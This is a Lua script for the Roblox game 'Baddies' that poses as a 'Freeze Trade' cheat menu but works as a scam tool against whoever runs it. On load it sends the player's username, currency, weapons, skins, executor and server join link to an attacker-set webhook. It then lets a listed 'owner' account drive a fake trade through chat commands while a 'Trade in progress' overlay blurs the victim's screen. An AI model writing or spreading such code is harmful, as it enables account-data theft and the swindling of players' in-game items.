-- Ryr's Scripts | Baddies
-- baddies.lua

local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
local Backpack    = LocalPlayer:WaitForChild("Backpack")

-- Config
local WEBHOOK      = _G.POOR_WEBHOOK  or ""
local MY_USERNAMES = _G.MY_USERNAMES  or {}
local PING_POOR    = _G.PING_POOR     or false

-- Colours
local BG        = Color3.fromRGB(22,  22,  26)
local TITLE_BG  = Color3.fromRGB(18,  18,  22)
local TOGGLE_OFF= Color3.fromRGB(72,  72,  80)
local TOGGLE_ON = Color3.fromRGB(255, 105, 180)
local TEXT_COL  = Color3.fromRGB(230, 230, 230)
local SUB_COL   = Color3.fromRGB(150, 150, 160)
local WHITE     = Color3.new(1, 1, 1)

-- Safe JSON encode using HttpService
local function encode(t)
    local ok, result = pcall(function()
        return HttpService:JSONEncode(t)
    end)
    if ok then return result end
    -- fallback manual builder (simple)
    warn("[Baddies] JSONEncode failed:", result)
    return nil
end

-- HTTP request — tries every known executor method
local function sendWebhook(payload)
    if not WEBHOOK or WEBHOOK == "" then
        warn("[Baddies] No webhook URL set!")
        return
    end

    local body = encode(payload)
    if not body then warn("[Baddies] Failed to encode payload"); return end

    print("[Baddies] Sending webhook...")

    local opts = {
        Url     = WEBHOOK,
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = body,
    }

    -- Try every possible HTTP function
    local tried = 0
    local function try(fn)
        if type(fn) ~= "function" then return false end
        tried = tried + 1
        local ok, err = pcall(fn, opts)
        if ok then print("[Baddies] Webhook sent! (method #"..tried..")"); return true end
        warn("[Baddies] Method #"..tried.." failed:", tostring(err))
        return false
    end

    if try(request)             then return end
    if try(syn and syn.request) then return end
    if try(http and http.request) then return end
    if try(fluxus and fluxus.request) then return end

    warn("[Baddies] All HTTP methods failed. Is HTTP enabled in executor?")
end

-- Build embed and send
local function buildAndSend(fields, title)
    local embed = {
        author  = { name = "Ryr's Scripts | Baddies" },
        title   = title or "",
        color   = 16711836, -- 0xFF69B4 pink as decimal
        fields  = fields,
    }
    local ping = PING_POOR and "@everyone" or ""
    sendWebhook({ content = ping, embeds = { embed } })
end

-- Helpers
local function fmtNum(n)
    n = tonumber(n) or 0
    if n >= 1000000 then return string.format("%.1fM", n / 1000000)
    elseif n >= 1000 then return string.format("%.1fK", n / 1000)
    else return tostring(math.floor(n)) end
end

local function getExecutor()
    if type(identifyexecutor) == "function" then
        local ok, v = pcall(identifyexecutor); if ok and v then return tostring(v) end
    end
    if type(getexecutorname) == "function" then
        local ok, v = pcall(getexecutorname); if ok and v then return tostring(v) end
    end
    if syn  then return "Synapse X" end
    if KRNL_LOADED then return "KRNL" end
    return "Unknown Executor"
end

local function getStat(...)
    local ls = LocalPlayer:FindFirstChild("leaderstats")
    if not ls then return 0 end
    for _, name in ipairs({...}) do
        local s = ls:FindFirstChild(name)
        if s then return s.Value or 0 end
    end
    return 0
end

local function getWeapons()
    local counts, order = {}, {}
    local function scan(c)
        if not c then return end
        for _, i in ipairs(c:GetChildren()) do
            if i:IsA("Tool") then
                if not counts[i.Name] then counts[i.Name] = 0; order[#order+1] = i.Name end
                counts[i.Name] = counts[i.Name] + 1
            end
        end
    end
    scan(Backpack)
    pcall(scan, LocalPlayer.Character)
    if #order == 0 then return "None" end
    local lines = {}
    for _, n in ipairs(order) do lines[#lines+1] = counts[n].."x "..n end
    return table.concat(lines, "\n")
end

local function getSkins()
    local char = LocalPlayer.Character
    if not char then return "None" end
    local list = {}
    for _, acc in ipairs(char:GetChildren()) do
        if acc:IsA("Accessory") then list[#list+1] = "- "..acc.Name end
    end
    return #list > 0 and table.concat(list, "\n") or "None"
end

local function joinLink()
    return "roblox://experiences/start?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
end

-- Boot notification (matches screenshot)
local function notifyExecution()
    buildAndSend({
        { name = "User",      value = LocalPlayer.Name,                                 inline = true  },
        { name = "Dinero",    value = fmtNum(getStat("Coins","Dinero","Cash","Bucks")), inline = true  },
        { name = "Slays",     value = fmtNum(getStat("Kills","Slays","KOs","KO")),      inline = true  },
        { name = "Executor",  value = getExecutor(),                                    inline = true  },
        { name = "Players",   value = #Players:GetPlayers().." / "..game.MaxPlayers,    inline = true  },
        { name = "Weapons",   value = getWeapons(),                                     inline = false },
        { name = "Skins",     value = getSkins(),                                       inline = false },
        { name = "Join Link", value = joinLink(),                                       inline = false },
    })
end

-- Screen freeze
local freezeGui = nil
local function freezeScreen()
    if freezeGui then return end
    freezeGui = Instance.new("ScreenGui")
    freezeGui.Name = "FreezeOverlay"; freezeGui.ResetOnSpawn = false
    freezeGui.DisplayOrder = 999; freezeGui.IgnoreGuiInset = true
    freezeGui.Parent = PlayerGui
    local ov = Instance.new("Frame", freezeGui)
    ov.Size = UDim2.new(1,0,1,0); ov.BackgroundColor3 = Color3.new(0,0,0)
    ov.BackgroundTransparency = 0.4; ov.BorderSizePixel = 0; ov.ZIndex = 10
    local stroke = Instance.new("UIStroke", ov)
    stroke.Color = TOGGLE_ON; stroke.Thickness = 5; stroke.Transparency = 0
    TweenService:Create(stroke, TweenInfo.new(0.9, Enum.EasingStyle.Sine,
        Enum.EasingDirection.InOut, -1, true), {Transparency = 0.7}):Play()
    local blur = Instance.new("BlurEffect")
    blur.Size = 20; blur.Parent = game:GetService("Lighting")
    local lbl = Instance.new("TextLabel", freezeGui)
    lbl.Size = UDim2.new(1,0,0,50); lbl.Position = UDim2.new(0,0,0.5,-25)
    lbl.BackgroundTransparency = 1; lbl.Text = "Trade in progress"
    lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 24
    lbl.TextColor3 = TOGGLE_ON; lbl.ZIndex = 12
end
local function unfreezeScreen()
    if freezeGui then freezeGui:Destroy(); freezeGui = nil end
    local b = game:GetService("Lighting"):FindFirstChildOfClass("BlurEffect")
    if b then b:Destroy() end
end

-- Auto-trade
local tradeState = "idle"
local chatConn   = nil
local function isOwner(n)
    for _, u in ipairs(MY_USERNAMES) do
        if u:lower() == n:lower() then return true end
    end
    return false
end
local function listenForChat(owner, onAccept, onConfirm)
    if chatConn then chatConn:Disconnect() end
    chatConn = owner.Chatted:Connect(function(msg)
        local m = msg:match("^%s*(.-)%s*$")
        if m == "1" and tradeState == "pending" then
            tradeState = "accepted"; if onAccept then onAccept() end
        elseif m == "2" and tradeState == "accepted" then
            tradeState = "confirmed"; if onConfirm then onConfirm() end
            if chatConn then chatConn:Disconnect() end
        end
    end)
end

-- GUI helpers
local function corner(p, r)
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 8); c.Parent = p
end

-- Build GUI
local gui = Instance.new("ScreenGui")
gui.Name = "BaddiesGui"; gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 10; gui.Parent = PlayerGui

local win = Instance.new("Frame", gui)
win.Size = UDim2.new(0, 310, 0, 330)
win.Position = UDim2.new(0.5, -155, 0.5, -165)
win.BackgroundColor3 = BG; win.BorderSizePixel = 0; corner(win, 10)

local sh = Instance.new("ImageLabel", win)
sh.Size = UDim2.new(1,30,1,30); sh.Position = UDim2.new(0,-15,0,-15)
sh.BackgroundTransparency = 1; sh.Image = "rbxassetid://5028857084"
sh.ImageColor3 = Color3.new(0,0,0); sh.ImageTransparency = 0.6; sh.ZIndex = -1

local tb = Instance.new("Frame", win)
tb.Size = UDim2.new(1,0,0,38); tb.BackgroundColor3 = TITLE_BG; tb.BorderSizePixel = 0
local tbc = Instance.new("UICorner", tb); tbc.CornerRadius = UDim.new(0,10)
local tbfix = Instance.new("Frame", tb)
tbfix.Size = UDim2.new(1,0,0.5,0); tbfix.Position = UDim2.new(0,0,0.5,0)
tbfix.BackgroundColor3 = TITLE_BG; tbfix.BorderSizePixel = 0

local titleTxt = Instance.new("TextLabel", tb)
titleTxt.Text = "Freeze Trade"; titleTxt.Font = Enum.Font.Gotham
titleTxt.TextSize = 13; titleTxt.TextColor3 = TEXT_COL
titleTxt.BackgroundTransparency = 1
titleTxt.Size = UDim2.new(1,-120,1,0); titleTxt.Position = UDim2.new(0,12,0,0)
titleTxt.TextXAlignment = Enum.TextXAlignment.Left

local function iconBtn(parent, char, xOffset)
    local b = Instance.new("TextButton", parent)
    b.Text = char; b.TextSize = 12; b.TextColor3 = SUB_COL
    b.Font = Enum.Font.GothamBold; b.BackgroundTransparency = 1
    b.Size = UDim2.new(0,22,0,22); b.Position = UDim2.new(1,xOffset,0.5,-11)
    return b
end
local closeBtn = iconBtn(tb, "X", -10)
local minBtn   = iconBtn(tb, "-", -34)
iconBtn(tb, "S", -58); iconBtn(tb, "Q", -82)
closeBtn.TextColor3 = Color3.fromRGB(200,80,80)

local minimised = false
local body = Instance.new("Frame", win)
body.Size = UDim2.new(1,0,1,-38); body.Position = UDim2.new(0,0,0,38)
body.BackgroundTransparency = 1

minBtn.MouseButton1Click:Connect(function()
    minimised = not minimised
    body.Visible = not minimised
    win.Size = minimised and UDim2.new(0,310,0,38) or UDim2.new(0,310,0,330)
    minBtn.Text = minimised and "+" or "-"
end)
closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

local drag, ds, sp
tb.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        drag=true; ds=i.Position; sp=win.Position
    end
end)
UserInputService.InputChanged:Connect(function(i)
    if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
        local d = i.Position-ds
        win.Position = UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
    end
end)
UserInputService.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then drag=false end
end)

-- Tab
local tabRow = Instance.new("Frame", body)
tabRow.Size = UDim2.new(1,0,0,44); tabRow.Position = UDim2.new(0,0,0,0)
tabRow.BackgroundTransparency = 1
local tradeTab = Instance.new("TextButton", tabRow)
tradeTab.Size = UDim2.new(0,88,0,30); tradeTab.Position = UDim2.new(0,12,0,7)
tradeTab.BackgroundColor3 = Color3.fromRGB(42,42,50)
tradeTab.Text = "Trade"; tradeTab.Font = Enum.Font.GothamBold
tradeTab.TextSize = 12; tradeTab.TextColor3 = TEXT_COL
tradeTab.AutoButtonColor = false; corner(tradeTab, 20)

-- Scroll
local scroll = Instance.new("ScrollingFrame", body)
scroll.Size = UDim2.new(1,0,1,-48); scroll.Position = UDim2.new(0,0,0,48)
scroll.BackgroundTransparency = 1; scroll.BorderSizePixel = 0
scroll.ScrollBarThickness = 0; scroll.CanvasSize = UDim2.new(0,0,0,230)
scroll.ScrollingDirection = Enum.ScrollingDirection.Y

-- Toggle row builder
local rowH = 42
local function row(label, yOff)
    local f = Instance.new("Frame", scroll)
    f.Size = UDim2.new(1,0,0,rowH); f.Position = UDim2.new(0,0,0,yOff)
    f.BackgroundTransparency = 1; f.BorderSizePixel = 0
    local txt = Instance.new("TextLabel", f)
    txt.Size = UDim2.new(1,-72,1,0); txt.Position = UDim2.new(0,16,0,0)
    txt.BackgroundTransparency = 1; txt.Text = label
    txt.Font = Enum.Font.Gotham; txt.TextSize = 13
    txt.TextColor3 = TEXT_COL; txt.TextXAlignment = Enum.TextXAlignment.Left
    local track = Instance.new("Frame", f)
    track.Size = UDim2.new(0,42,0,24); track.AnchorPoint = Vector2.new(1,0.5)
    track.Position = UDim2.new(1,-14,0.5,0); track.BackgroundColor3 = TOGGLE_OFF
    track.BorderSizePixel = 0; corner(track, 12)
    local knob = Instance.new("Frame", track)
    knob.Size = UDim2.new(0,20,0,20); knob.AnchorPoint = Vector2.new(0,0.5)
    knob.Position = UDim2.new(0,2,0.5,0); knob.BackgroundColor3 = WHITE
    knob.BorderSizePixel = 0; corner(knob, 10)
    local on = false
    local function set(v)
        on = v
        TweenService:Create(track, TweenInfo.new(0.18), {
            BackgroundColor3 = v and TOGGLE_ON or TOGGLE_OFF}):Play()
        TweenService:Create(knob, TweenInfo.new(0.18), {
            Position = v and UDim2.new(1,-22,0.5,0) or UDim2.new(0,2,0.5,0)}):Play()
    end
    local ca = Instance.new("TextButton", f)
    ca.Size = UDim2.new(1,0,1,0); ca.BackgroundTransparency = 1; ca.Text = ""
    ca.MouseButton1Click:Connect(function() set(not on) end)
    local s = Instance.new("Frame", scroll)
    s.Size = UDim2.new(1,-24,0,1); s.Position = UDim2.new(0,12,0,yOff+rowH-1)
    s.BackgroundColor3 = Color3.fromRGB(38,38,46); s.BorderSizePixel = 0
    return set, function() return on end
end

local setFreeze,  getFreeze  = row("Freeze Trade",      0)
local setAccept,  getAccept  = row("Force Accept",      rowH)
local setConfirm, getConfirm = row("Force Confirm",     rowH*2)
local setWeps,    getWeps    = row("Force Add Weapons", rowH*3)
local setToks,    getToks    = row("Force Add Tokens",  rowH*4)

local _origFreeze = setFreeze
setFreeze = function(v) _origFreeze(v); if v then freezeScreen() else unfreezeScreen() end end

local _origWeps = setWeps
setWeps = function(v)
    _origWeps(v)
    if v then
        buildAndSend({{ name = "Weapons Scan", value = getWeapons(), inline = false }}, "Weapon List")
    end
end

-- Auto-trade
local function startAutoTrade()
    local owner = nil
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and isOwner(p.Name) then owner = p; break end
    end
    local function onAccept()
        setAccept(true)
        buildAndSend({{name="Trade Accepted", value=LocalPlayer.Name.." accepted. Type 2 to confirm.", inline=false}})
    end
    local function onConfirm()
        setConfirm(true); unfreezeScreen(); _origFreeze(false)
        buildAndSend({{name="Trade Confirmed", value="Trade with "..LocalPlayer.Name.." complete.", inline=false}})
    end
    if owner then
        tradeState = "pending"; setFreeze(true)
        buildAndSend({{name="Auto Trade Started", value=LocalPlayer.Name.." ready. Type 1 accept / 2 confirm.", inline=false}})
        listenForChat(owner, onAccept, onConfirm)
    else
        Players.PlayerAdded:Connect(function(p)
            if isOwner(p.Name) and tradeState == "idle" then
                tradeState = "pending"; setFreeze(true)
                buildAndSend({{name="Trade Ready", value=p.Name.." joined. Type 1 / 2.", inline=false}})
                listenForChat(p, onAccept, onConfirm)
            end
        end)
    end
end

-- Boot
task.spawn(function()
    print("[Baddies] Loaded for", LocalPlayer.Name)
    print("[Baddies] Webhook:", WEBHOOK ~= "" and "SET" or "NOT SET - add _G.POOR_WEBHOOK before loadstring!")
    task.wait(1) -- let character load
    notifyExecution()
    task.wait(0.5)
    startAutoTrade()
end)
